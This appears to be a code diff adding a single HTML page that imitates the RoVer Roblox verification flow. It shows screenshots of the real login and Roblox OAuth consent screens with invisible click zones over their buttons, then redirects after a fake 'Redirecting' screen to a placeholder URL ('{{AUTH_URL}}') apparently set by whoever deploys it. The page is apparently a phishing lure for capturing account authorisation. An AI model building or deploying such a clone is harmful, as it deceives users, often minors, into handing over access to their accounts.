@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>RoVer</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    html, body {
+      background: #1c1c1c;
+      width: 100%;
+      min-height: 100%;
+    }
+
+    .screen {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      opacity: 0;
+      transition: opacity 0.3s ease;
+    }
+    .screen.active {
+      display: flex;
+    }
+    .screen.visible {
+      opacity: 1;
+    }
+
+    .img-wrap {
+      position: relative;
+      width: 100%;
+      max-width: 1600px;
+    }
+
+    .img-wrap img {
+      display: block;
+      width: 100%;
+      height: auto;
+      filter: brightness(1.06) contrast(1.02);
+    }
+
+    .zone {
+      position: absolute;
+      cursor: pointer;
+    }
+
+    /* ── SCREEN 0: "Log in with Roblox" ── */
+    #z0-login {
+      top: 60%;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 22%;
+      height: 9%;
+      border-radius: 999px;
+    }
+
+    /* ── SCREEN 1: "Continue" ── */
+    #z1-continue {
+      top: 69%;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 46%;
+      height: 6%;
+      border-radius: 6px;
+    }
+
+    /* ── SCREEN 1: "Return to RoVer" ── */
+    #z1-return {
+      top: 81%;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 46%;
+      height: 6%;
+      border-radius: 6px;
+    }
+
+    /* ── TABLET PORTRAIT ── */
+    @media (max-width: 1024px) and (orientation: portrait) {
+      #z0-login    { width: 26%; height: 9%; }
+      #z1-continue { width: 50%; height: 7%; }
+      #z1-return   { width: 50%; height: 7%; }
+    }
+
+    /* ── PHONE PORTRAIT ── */
+    @media (max-width: 600px) {
+      #z0-login    { width: 32%; height: 9%; }
+      #z1-continue { width: 54%; height: 8%; }
+      #z1-return   { width: 54%; height: 8%; }
+    }
+
+    /* ── PHONE / TABLET LANDSCAPE ── */
+    @media (max-width: 900px) and (orientation: landscape) {
+      #z0-login    { width: 24%; height: 10%; }
+      #z1-continue { width: 50%; height: 8%; }
+      #z1-return   { width: 50%; height: 8%; }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- SCREEN 0: Sign in to RoVer + footer -->
+  <div id="s0" class="screen active">
+    <div class="img-wrap">
+      <img src="/verify-page.png" alt="">
+      <div id="z0-login" class="zone" onclick="showScreen('s1')"></div>
+    </div>
+    <div class="img-wrap">
+      <img src="/footer-page.png" alt="">
+    </div>
+  </div>
+
+  <!-- SCREEN 1: Authorize with Roblox OAuth -->
+  <div id="s1" class="screen">
+    <div class="img-wrap">
+      <img src="/oauth-page.png" alt="">
+      <div id="z1-continue" class="zone" onclick="startRedirect()"></div>
+      <div id="z1-return"   class="zone" onclick="showScreen('s0')"></div>
+    </div>
+  </div>
+
+  <!-- SCREEN 2: Redirecting -->
+  <div id="s2" class="screen">
+    <div class="img-wrap">
+      <img src="/redirect-page.png" alt="">
+    </div>
+  </div>
+
+  <script>
+    const FINAL_URL = '{{AUTH_URL}}';
+
+    function showScreen(id) {
+      const screens = document.querySelectorAll('.screen');
+      screens.forEach(s => {
+        s.classList.remove('visible');
+        setTimeout(() => s.classList.remove('active'), 300);
+      });
+      setTimeout(() => {
+        screens.forEach(s => s.classList.remove('active'));
+        const next = document.getElementById(id);
+        next.classList.add('active');
+        window.scrollTo(0, 0);
+        requestAnimationFrame(() => {
+          requestAnimationFrame(() => next.classList.add('visible'));
+        });
+      }, 300);
+    }
+
+    function startRedirect() {
+      showScreen('s2');
+      setTimeout(() => { window.location.href = FINAL_URL; }, 1300);
+    }
+
+    // fade in on load
+    window.addEventListener('load', () => {
+      document.getElementById('s0').classList.add('visible');
+    });
+  </script>
+
+</body>
+</html>
